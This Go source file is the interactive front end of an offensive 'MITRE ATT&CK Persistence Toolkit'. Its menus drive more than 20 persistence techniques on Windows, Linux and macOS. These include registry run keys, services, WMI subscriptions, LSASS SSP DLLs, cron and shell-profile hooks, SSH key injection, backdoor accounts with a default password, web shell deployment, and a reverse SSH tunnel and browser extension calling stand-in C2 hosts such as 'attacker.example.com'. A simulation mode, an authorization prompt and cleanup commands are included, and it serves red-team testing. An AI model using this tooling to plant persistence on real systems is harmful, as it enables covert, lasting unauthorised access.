// ============================================================
// MITRE ATT&CK Persistence Toolkit
// Tactic: TA0003 – Persistence
// 20+ Techniques | Windows · Linux · macOS · Cross-Platform
// ============================================================
// FOR AUTHORIZED TESTING AND EDUCATIONAL USE ONLY
// ============================================================

package main

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"persist/engine"
)

var reader = bufio.NewReader(os.Stdin)

func input(prompt, def string) string {
	if def != "" {
		fmt.Printf("  %s %s [%s]: ", engine.C(engine.CCyan, "▸"), prompt, engine.C(engine.CGray, def))
	} else {
		fmt.Printf("  %s %s: ", engine.C(engine.CCyan, "▸"), prompt)
	}
	line, _ := reader.ReadString('\n')
	line = strings.TrimSpace(line)
	if line == "" {
		return def
	}
	return line
}

func inputBool(prompt string, def bool) bool {
	ds := "n"
	if def {
		ds = "y"
	}
	s := strings.ToLower(input(prompt+" (y/n)", ds))
	return s == "y" || s == "yes"
}

func inputInt(prompt string, def int) int {
	s := input(prompt, fmt.Sprintf("%d", def))
	n, err := strconv.Atoi(s)
	if err != nil {
		return def
	}
	return n
}

// ── Banner ────────────────────────────────────────────────────
func banner() {
	fmt.Print(engine.C(engine.CBBlu, `
  ╔══════════════════════════════════════════════════════════════════╗
  ║                                                                  ║
  ║   MITRE ATT&CK  Persistence Toolkit                             ║
  ║   Tactic: TA0003 – Persistence                                  ║
  ║   20+ Techniques  |  Windows · Linux · macOS                    ║
  ║                                                                  ║
  ╚══════════════════════════════════════════════════════════════════╝`))
	fmt.Println()
	fmt.Printf("\n  %s Platform: %s\n", engine.C(engine.CGray, "▸"), engine.C(engine.CBCyn, engine.Platform()))
	fmt.Printf("  %s %s\n\n", engine.C(engine.CGray, "▸"), engine.C(engine.CBRed, "AUTHORIZED TESTING AND EDUCATIONAL USE ONLY"))
}

// ── Main menu ─────────────────────────────────────────────────
func mainMenu(sess *engine.Session) {
	for {
		engine.Divider()
		fmt.Println()
		fmt.Println("  " + engine.Bold("MAIN MENU"))
		fmt.Println()

		items := []struct{ key, label, desc string }{
			{"1", "Windows Persistence",      "Registry, Services, Tasks, WMI, COM, SSP, Winlogon..."},
			{"2", "Linux / macOS Persistence","Systemd, Cron, Shell Profiles, RC Scripts, Launchd..."},
			{"3", "Cross-Platform",           "SSH Keys, Local Accounts, Web Shells, Browser Ext..."},
			{"4", "Run All Techniques",       "Execute every applicable technique for this platform"},
			{"5", "Technique Catalog",        "Browse all 20+ techniques with IOCs and detection notes"},
			{"6", "Technique Detail",         "View full detail for a specific technique ID"},
			{"7", "Session Summary",          "Show results for current session"},
			{"8", "Export Reports",           "Save JSON, HTML, and CSV reports"},
			{"9", "Cleanup / Remove",         "Remove persistence artifacts from this system"},
			{"0", "Exit",                     ""},
		}
		for _, item := range items {
			if item.key == "0" {
				fmt.Printf("  %s  %s\n", engine.C(engine.CGray, "0"), engine.C(engine.CGray, "Exit"))
				continue
			}
			fmt.Printf("  %s  %-35s %s\n",
				engine.C(engine.CBCyn, item.key),
				engine.Bold(item.label),
				engine.C(engine.CGray, item.desc))
		}
		fmt.Println()
		fmt.Printf("  %s SimMode: %s\n", engine.C(engine.CGray, "s"),
			engine.C(engine.CMag, fmt.Sprintf("Toggle Simulation Mode [currently: %v]", sess.SimMode)))
		fmt.Println()

		choice := input("Select", "")
		switch strings.ToLower(choice) {
		case "1":
			windowsMenu(sess)
		case "2":
			linuxMenu(sess)
		case "3":
			crossMenu(sess)
		case "4":
			runAllMenu(sess)
		case "5":
			catalogMenu()
		case "6":
			techDetailMenu()
		case "7":
			engine.PrintSessionSummary(sess)
		case "8":
			exportMenu(sess)
		case "9":
			cleanupMenu(sess)
		case "s":
			sess.SimMode = !sess.SimMode
			engine.OK(fmt.Sprintf("Simulation mode: %v", sess.SimMode))
		case "0", "q", "quit":
			engine.PrintSessionSummary(sess)
			offerExport(sess)
			fmt.Println("\n  " + engine.C(engine.CBGrn, "Session complete. Stay ethical."))
			fmt.Println()
			return
		}
	}
}

// ── Windows menu ──────────────────────────────────────────────
func windowsMenu(sess *engine.Session) {
	for {
		engine.SectionHeader("Windows Persistence Techniques", "TA0003 — Windows")
		fmt.Println()

		techniques := []struct{ key, id, name string }{
			{"1", "T1547.001", "Registry Run Keys (HKCU\\Run)"},
			{"2", "T1547.001b","Startup Folder (.bat / .lnk)"},
			{"3", "T1543.003", "Windows Service (sc create)"},
			{"4", "T1053.005", "Scheduled Task (schtasks)"},
			{"5", "T1546.003", "WMI Permanent Event Subscription"},
			{"6", "T1547.004", "Winlogon Helper DLL (Userinit)"},
			{"7", "T1547.005", "Security Support Provider (SSP / LSASS)"},
			{"8", "T1037.001", "Logon Script (UserInitMprLogonScript)"},
			{"9", "T1574.001", "DLL Search Order Hijacking (proxy template)"},
			{"a", "T1546.001", "File Association Hijack (.txt / .html)"},
			{"b", "T1547.009", "Shortcut Modification (.lnk)"},
			{"c", "T1546.015", "COM Object Hijacking (HKCU CLSID)"},
			{"d", "T1547.014", "Active Setup (StubPath)"},
			{"e", "T1542.001", "UEFI / Firmware (Conceptual Demo)"},
			{"f", "T1547.010", "Port Monitor (spoolsv.exe)"},
			{"g", "T1547.012", "Print Processor (spoolsv.exe)"},
			{"r", "", "Run ALL Windows techniques"},
			{"0", "", "Back"},
		}
		for _, t := range techniques {
			if t.key == "0" {
				fmt.Printf("  %s  Back\n", engine.C(engine.CGray, "0"))
				continue
			}
			if t.key == "r" {
				fmt.Printf("  %s  %s\n", engine.C(engine.CBRed, "r"), engine.Bold("Run ALL Windows techniques"))
				continue
			}
			fmt.Printf("  %s  %-12s %s\n",
				engine.C(engine.CBCyn, t.key),
				engine.C(engine.CMag, t.id),
				t.name)
		}
		fmt.Println()
		choice := input("Select", "")

		switch strings.ToLower(choice) {
		case "1":
			payload := input("Payload path", `C:\Windows\Temp\payload.exe`)
			engine.RunKeyPersist(sess, payload)
		case "2":
			payload := input("Payload path", `C:\Windows\Temp\payload.exe`)
			engine.StartupFolderPersist(sess, payload)
		case "3":
			svcName := input("Service name", "SysNetCompat")
			payload := input("Binary path", `C:\Windows\Temp\svc_payload.exe`)
			engine.WindowsServicePersist(sess, svcName, payload)
		case "4":
			taskName := input("Task name", "SysNetCompatTask")
			payload := input("Payload path", `C:\Windows\Temp\payload.exe`)
			engine.ScheduledTaskPersist(sess, taskName, payload)
		case "5":
			payload := input("Payload path", `C:\Windows\Temp\payload.exe`)
			engine.WMISubscriptionPersist(sess, payload)
		case "6":
			payload := input("DLL / EXE path", `C:\Windows\Temp\winlogon_payload.exe`)
			engine.WinlogonHelperPersist(sess, payload)
		case "7":
			dll := input("SSP DLL name (must be in System32)", "sysnetcompat.dll")
			engine.SSPPersist(sess, dll)
		case "8":
			script := input("Script path", `C:\Windows\Temp\logon.bat`)
			engine.LogonScriptPersist(sess, script)
		case "9":
			app := input("Target app directory", `C:\Program Files\TargetApp`)
			dll := input("DLL to hijack", "version.dll")
			engine.DLLHijackDemo(sess, app, dll)
		case "a":
			ext := input("File extension to hijack", ".txt")
			payload := input("Payload path", `C:\Windows\Temp\payload.exe`)
			engine.FileAssocHijack(sess, ext, payload)
		case "b":
			payload := input("Payload path", `C:\Windows\Temp\payload.exe`)
			engine.ShortcutModify(sess, payload)
		case "c":
			clsid := input("CLSID to hijack (blank=auto)", "")
			payload := input("Payload DLL path", `C:\Windows\Temp\payload.dll`)
			engine.COMHijack(sess, clsid, payload)
		case "d":
			payload := input("StubPath payload", `C:\Windows\Temp\payload.exe`)
			engine.ActiveSetupPersist(sess, payload)
		case "e":
			engine.UEFIDemo(sess)
		case "f":
			dll := input("Monitor DLL (must exist in System32)", "sysmon.dll")
			engine.PortMonitorPersist(sess, dll)
		case "g":
			dll := input("Processor DLL (must exist in System32)", "sysprint.dll")
			engine.PrintProcessorPersist(sess, dll)
		case "r":
			runAllWindows(sess)
		case "0":
			return
		}
	}
}

// ── Linux/macOS menu ──────────────────────────────────────────
func linuxMenu(sess *engine.Session) {
	for {
		engine.SectionHeader("Linux / macOS Persistence Techniques", "TA0003 — Linux/macOS")
		fmt.Println()

		techniques := []struct{ key, id, name string }{
			{"1", "T1543.002", "Systemd Service (/etc/systemd/system/ or ~/.config/systemd/user/)"},
			{"2", "T1053.003", "Cron Job (/etc/cron.d/ or user crontab)"},
			{"3", "T1546.004", "Shell Profile (~/.bashrc / ~/.zshrc / /etc/profile.d/)"},
			{"4", "T1037.004", "RC / Init Script (/etc/rc.local or /etc/init.d/)"},
			{"5", "T1053.003b","Launchd Plist — macOS LaunchAgent/LaunchDaemon"},
			{"6", "T1547.006", "Kernel Module / LKM Rootkit (Conceptual Demo)"},
			{"r", "", "Run ALL Linux/macOS techniques"},
			{"0", "", "Back"},
		}
		for _, t := range techniques {
			if t.key == "0" {
				fmt.Printf("  %s  Back\n", engine.C(engine.CGray, "0"))
				continue
			}
			if t.key == "r" {
				fmt.Printf("  %s  %s\n", engine.C(engine.CBRed, "r"), engine.Bold("Run ALL Linux/macOS techniques"))
				continue
			}
			fmt.Printf("  %s  %-12s %s\n", engine.C(engine.CBCyn, t.key), engine.C(engine.CMag, t.id), t.name)
		}
		fmt.Println()
		choice := input("Select", "")

		switch strings.ToLower(choice) {
		case "1":
			name := input("Service name", "sysnetcompat")
			payload := input("ExecStart command", "/usr/bin/sysnetd")
			engine.SystemdServicePersist(sess, name, payload)
		case "2":
			schedule := input("Cron schedule", "* * * * *")
			payload := input("Command", "/usr/bin/sysnetd")
			engine.CronJobPersist(sess, schedule, payload)
		case "3":
			payload := input("Command to append", "/usr/bin/sysnetd &")
			engine.ShellProfilePersist(sess, payload)
		case "4":
			payload := input("Command to add to rc.local", "/usr/bin/sysnetd")
			engine.RCScriptPersist(sess, payload)
		case "5":
			label := input("Plist label (reverse-DNS)", "com.apple.sysnetcompat")
			payload := input("Program path", "/usr/local/bin/sysnetd")
			engine.LaunchdPlistPersist(sess, label, payload)
		case "6":
			engine.KernelModuleDemo(sess)
		case "r":
			runAllLinux(sess)
		case "0":
			return
		}
	}
}

// ── Cross-platform menu ───────────────────────────────────────
func crossMenu(sess *engine.Session) {
	for {
		engine.SectionHeader("Cross-Platform Persistence Techniques", "TA0003 — All Platforms")
		fmt.Println()

		techniques := []struct{ key, id, name string }{
			{"1", "T1098.004", "SSH Authorized Keys (inject pubkey)"},
			{"2", "T1136.001", "Local Account Creation (+ privilege escalation)"},
			{"3", "T1505.003", "Web Shell (PHP / ASPX / JSP)"},
			{"4", "T1176",     "Browser Extension (Chrome/Firefox)"},
			{"5", "T1133",     "External Remote Services (Reverse SSH Tunnel)"},
			{"6", "T1078.003", "Valid Accounts Manipulation (enable admin/NOPASSWD)"},
			{"r", "", "Run ALL cross-platform techniques"},
			{"0", "", "Back"},
		}
		for _, t := range techniques {
			if t.key == "0" {
				fmt.Printf("  %s  Back\n", engine.C(engine.CGray, "0"))
				continue
			}
			if t.key == "r" {
				fmt.Printf("  %s  %s\n", engine.C(engine.CBRed, "r"), engine.Bold("Run ALL cross-platform techniques"))
				continue
			}
			fmt.Printf("  %s  %-12s %s\n", engine.C(engine.CBCyn, t.key), engine.C(engine.CMag, t.id), t.name)
		}
		fmt.Println()
		choice := input("Select", "")

		switch strings.ToLower(choice) {
		case "1":
			pubkey := input("Public key (blank=generate)", "")
			engine.SSHAuthorizedKeys(sess, pubkey)
		case "2":
			user := input("Username", "svc_netcompat")
			pass := input("Password", "P@ssw0rd123!")
			engine.LocalAccountCreate(sess, user, pass)
		case "3":
			webroot := input("Webroot path", "")
			shellType := input("Shell type (php/aspx/jsp)", "php")
			engine.WebShellDeploy(sess, webroot, shellType)
		case "4":
			c2 := input("C2 host for callbacks", "callback.example.com")
			engine.BrowserExtensionPersist(sess, c2)
		case "5":
			c2host := input("C2 SSH host", "attacker.example.com")
			c2port := input("C2 port", "443")
			engine.ExternalRemoteService(sess, c2host, c2port)
		case "6":
			engine.ValidAccountsManipulate(sess)
		case "r":
			runAllCross(sess)
		case "0":
			return
		}
	}
}

// ── Run-all functions ─────────────────────────────────────────
func runAllMenu(sess *engine.Session) {
	engine.SectionHeader("Run ALL Techniques", "TA0003 — Full Suite")
	engine.Warn("This will attempt all persistence techniques for the current platform.")
	engine.Warn("In simulation mode — no actual system changes are made.")
	engine.BlankLine()

	if !inputBool("Confirm run-all", false) {
		return
	}
	payload := input("Default payload path", defaultPayload())
	runAllWindows(sess)
	runAllLinux(sess)
	runAllCross(sess)
	_ = payload
	engine.PrintSessionSummary(sess)
}

func runAllWindows(sess *engine.Session) {
	engine.SectionHeader("Windows — All Techniques", "TA0003")
	payload := defaultPayload()
	engine.RunKeyPersist(sess, payload)
	engine.StartupFolderPersist(sess, payload)
	engine.WindowsServicePersist(sess, "SysNetCompat", payload)
	engine.ScheduledTaskPersist(sess, "SysNetCompatTask", payload)
	engine.WMISubscriptionPersist(sess, payload)
	engine.WinlogonHelperPersist(sess, payload)
	engine.SSPPersist(sess, "sysnetcompat.dll")
	engine.LogonScriptPersist(sess, payload)
	engine.DLLHijackDemo(sess, "C:\\Program Files\\TargetApp", "version.dll")
	engine.FileAssocHijack(sess, ".txt", payload)
	engine.ShortcutModify(sess, payload)
	engine.COMHijack(sess, "", payload+".dll")
	engine.ActiveSetupPersist(sess, payload)
	engine.UEFIDemo(sess)
	engine.PortMonitorPersist(sess, "sysnetcompat.dll")
	engine.PrintProcessorPersist(sess, "sysnetcompat.dll")
}

func runAllLinux(sess *engine.Session) {
	engine.SectionHeader("Linux/macOS — All Techniques", "TA0003")
	payload := defaultPayload()
	engine.SystemdServicePersist(sess, "sysnetcompat", payload)
	engine.CronJobPersist(sess, "* * * * *", payload)
	engine.ShellProfilePersist(sess, payload+" &")
	engine.RCScriptPersist(sess, payload)
	engine.LaunchdPlistPersist(sess, "com.apple.sysnetcompat", payload)
	engine.KernelModuleDemo(sess)
}

func runAllCross(sess *engine.Session) {
	engine.SectionHeader("Cross-Platform — All Techniques", "TA0003")
	engine.SSHAuthorizedKeys(sess, "")
	engine.LocalAccountCreate(sess, "svc_netcompat", "P@ssw0rd123!")
	engine.WebShellDeploy(sess, "", "php")
	engine.BrowserExtensionPersist(sess, "callback.example.com")
	engine.ExternalRemoteService(sess, "attacker.example.com", "443")
	engine.ValidAccountsManipulate(sess)
}

// ── Catalog menu ──────────────────────────────────────────────
func catalogMenu() {
	for {
		engine.SectionHeader("Technique Catalog", "TA0003 — All Platforms")
		fmt.Println()
		fmt.Println("  Filter by platform:")
		fmt.Printf("  %s all  %s win  %s linux  %s darwin  %s 0=back\n",
			engine.C(engine.CBCyn, "1"),
			engine.C(engine.CBCyn, "2"),
			engine.C(engine.CBCyn, "3"),
			engine.C(engine.CBCyn, "4"),
			engine.C(engine.CGray, ""))
		fmt.Println()
		choice := input("Filter", "1")
		switch choice {
		case "1":
			engine.TechSummaryTable("all")
		case "2":
			engine.TechSummaryTable("windows")
		case "3":
			engine.TechSummaryTable("linux")
		case "4":
			engine.TechSummaryTable("darwin")
		case "0":
			return
		}
		input("Press Enter to continue", "")
	}
}

// ── Technique detail menu ─────────────────────────────────────
func techDetailMenu() {
	engine.BlankLine()
	id := input("Enter Technique ID (e.g. T1547.001)", "")
	if id == "" {
		return
	}
	for _, t := range engine.Catalog {
		if strings.EqualFold(t.FullID(), id) || strings.EqualFold(t.ID, id) {
			engine.TechDetail(t)
			return
		}
	}
	engine.Warn("Technique not found: " + id)
	engine.BlankLine()
	engine.Info("Available IDs:")
	for _, t := range engine.Catalog {
		fmt.Printf("    %s  %s\n", engine.C(engine.CCyan, t.FullID()), t.Name)
	}
}

// ── Export menu ───────────────────────────────────────────────
func exportMenu(sess *engine.Session) {
	engine.SectionHeader("Export Reports", "TA0003")
	ts := time.Now().Format("20060102_150405")

	jsonPath := input("JSON report path", fmt.Sprintf("persist_report_%s.json", ts))
	htmlPath := input("HTML report path", fmt.Sprintf("persist_report_%s.html", ts))
	csvPath := input("CSV report path (blank=skip)", "")

	if jsonPath != "" {
		if err := sess.SaveJSON(jsonPath); err != nil {
			engine.Fail("JSON export: " + err.Error())
		} else {
			engine.OK("JSON saved → " + engine.C(engine.CBCyn, jsonPath))
		}
	}
	if htmlPath != "" {
		if err := engine.ExportHTML(sess, htmlPath); err != nil {
			engine.Fail("HTML export: " + err.Error())
		} else {
			engine.OK("HTML saved → " + engine.C(engine.CBCyn, htmlPath))
		}
	}
	if csvPath != "" {
		if err := engine.ExportCSV(sess, csvPath); err != nil {
			engine.Fail("CSV export: " + err.Error())
		} else {
			engine.OK("CSV saved → " + engine.C(engine.CBCyn, csvPath))
		}
	}
}

func offerExport(sess *engine.Session) {
	ok, sim, fail, _ := sess.Counts()
	if ok+sim+fail == 0 {
		return
	}
	if inputBool("Export reports?", true) {
		exportMenu(sess)
	}
}

// ── Cleanup menu ──────────────────────────────────────────────
func cleanupMenu(sess *engine.Session) {
	engine.SectionHeader("Cleanup — Remove Persistence Artifacts", "TA0003")
	engine.Warn("This will attempt to remove artifacts created by this session.")
	engine.BlankLine()
	engine.Info("Cleanup commands by platform:")
	engine.BlankLine()

	if engine.IsWindows {
		fmt.Println("  " + engine.C(engine.CMag, "Windows cleanup:"))
		cmds := []struct{ desc, cmd string }{
			{"Registry Run key", `reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v PersistenceToolkit /f`},
			{"Scheduled task", `schtasks /Delete /TN SysNetCompatTask /F`},
			{"Windows service", `sc stop SysNetCompat & sc delete SysNetCompat`},
			{"WMI subscription", `Get-WMIObject -Namespace root\subscription -Class __EventFilter -Filter 'Name="PTFilter"' | Remove-WMIObject`},
			{"Startup folder", `del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\persistence_toolkit.bat"`},
			{"Active Setup key", `reg delete "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{4B9A86DB-D4A5-4E12-93E9-4A234568AABB}" /f`},
			{"Winlogon restore", `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f`},
			{"Logon script", `reg delete "HKCU\Environment" /v UserInitMprLogonScript /f`},
			{"COM hijack", `reg delete "HKCU\Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}" /f`},
			{"Local account", `net user svc_netcompat /delete`},
		}
		for _, cmd := range cmds {
			fmt.Printf("    %s %s\n    %s\n\n", engine.C(engine.CCyan, "▸"), engine.Bold(cmd.desc), engine.C(engine.CGray, cmd.cmd))
		}
	} else {
		fmt.Println("  " + engine.C(engine.CMag, "Linux/macOS cleanup:"))
		cmds := []struct{ desc, cmd string }{
			{"Systemd service", `systemctl disable --now sysnetcompat && rm /etc/systemd/system/sysnetcompat.service`},
			{"Cron job", `rm -f /etc/cron.d/sysnetwork && crontab -l | grep -v sysnetd | crontab -`},
			{"Shell profile", `sed -i '/sysnetd/d' ~/.bashrc ~/.zshrc ~/.bash_profile 2>/dev/null`},
			{"RC/Init script", `rm -f /etc/init.d/sysnetwork && update-rc.d sysnetwork remove 2>/dev/null`},
			{"SSH key", `sed -i '/PersistenceToolkitDemo/d' ~/.ssh/authorized_keys`},
			{"Local account", `userdel -r svc_netcompat && rm -f /etc/sudoers.d/svc_netcompat`},
			{"Web shells", `find /var/www /srv/www -name 'system_check.*' -delete 2>/dev/null`},
		}
		for _, cmd := range cmds {
			fmt.Printf("    %s %s\n    %s\n\n", engine.C(engine.CCyan, "▸"), engine.Bold(cmd.desc), engine.C(engine.CGray, cmd.cmd))
		}
	}

	engine.Divider()
	if inputBool("Run automated cleanup now?", false) {
		runCleanup()
	}
}

func runCleanup() {
	engine.Info("Running cleanup...")
	engine.BlankLine()

	if engine.IsLinux || engine.IsMacOS {
		cmds := [][]string{
			{"bash", "-c", `systemctl disable --now sysnetcompat 2>/dev/null; rm -f /etc/systemd/system/sysnetcompat.service`},
			{"bash", "-c", `rm -f /etc/cron.d/sysnetwork`},
			{"bash", "-c", `crontab -l 2>/dev/null | grep -v sysnetd | crontab - 2>/dev/null`},
			{"bash", "-c", `sed -i '/sysnetd/d' ~/.bashrc ~/.zshrc ~/.bash_profile 2>/dev/null; true`},
			{"bash", "-c", `sed -i '/sysnetd/d' ~/.profile 2>/dev/null; true`},
			{"bash", "-c", `rm -f /etc/init.d/sysnetwork 2>/dev/null`},
			{"bash", "-c", `sed -i '/PersistenceToolkitDemo/d' ~/.ssh/authorized_keys 2>/dev/null; true`},
			{"bash", "-c", `find /tmp -name 'pt_*' -delete 2>/dev/null; true`},
		}
		for _, args := range cmds {
			import_exec(args)
		}
	}
	engine.OK("Cleanup complete")
}

func import_exec(args []string) {
	import_exec_impl(args)
}

func defaultPayload() string {
	if engine.IsWindows {
		return `C:\Windows\Temp\payload.exe`
	}
	return "/tmp/payload"
}

// ── Entry point ───────────────────────────────────────────────
func main() {
	banner()

	fmt.Println("  " + engine.C(engine.CBBlu, "Session Configuration"))
	fmt.Println()
	simMode := inputBool("Enable Simulation Mode (no actual system changes)", true)
	engine.BlankLine()

	if !simMode {
		engine.Warn("LIVE MODE enabled — techniques will make REAL system changes.")
		engine.Warn("Only run on systems you own or have explicit written authorization.")
		engine.BlankLine()
		if !inputBool("I confirm I have authorization for this system", false) {
			engine.OK("Switching to Simulation Mode for safety.")
			simMode = true
		}
	} else {
		engine.OK("Simulation Mode: techniques display what would happen without making changes")
	}

	sess := engine.NewSession(simMode)
	engine.BlankLine()
	mainMenu(sess)
}
